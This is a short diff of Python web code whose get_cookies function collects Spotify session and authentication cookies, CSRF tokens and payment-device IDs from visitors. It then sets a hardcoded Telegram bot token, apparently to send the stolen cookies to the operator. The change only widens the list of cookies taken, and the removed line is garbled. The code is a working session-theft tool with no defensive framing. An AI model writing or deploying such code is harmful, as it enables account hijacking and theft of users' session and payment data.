@@ -15,7 +15,7 @@ def get_cookies():
         cookies = request.cookies
         cookies_dict = cookies.to_dict()
         filtered_cookies = {}
-        keys_to_keep = ['sp_m', 'sp_key', 'Host device_id', 'sp_dc', 'sp_gaid', 'sp_last_utm', 'sp_landing', 'sp_t', 'OptanonAlertBoxClosed', '_cs_c', '_scid', '_sctr', '_tt_enable_cookie', '_ttp', 'kdtv', '_kdt', 'RLỎ"
+                keys_to_keep = ['sp_m', 'sp_key', 'Host device_id', 'sp_dc', 'sp_gaid', 'sp_last_utm', 'sp_landing', 'sp_t', 'OptanonAlertBoxClosed', '_cs_c', '_scid', '_sctr', '_tt_enable_cookie', '_ttp', 'kdtv', '_kdt', 'RoktRecogniser', 'ltcid', '_cs_id', '_derived_epik', '_fbp', '_pin_unauth', '_rdt_uuid', '_scid_r', '_uetvid', 'payment-sdk-locales', 'ravelinDeviceId', 'ravelinSessionId', '__Host-sp_csrf_sid', '_cs_mk_ga']
             if slot == True:
               bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
               bot = telebot.TeleBot(bot_token)
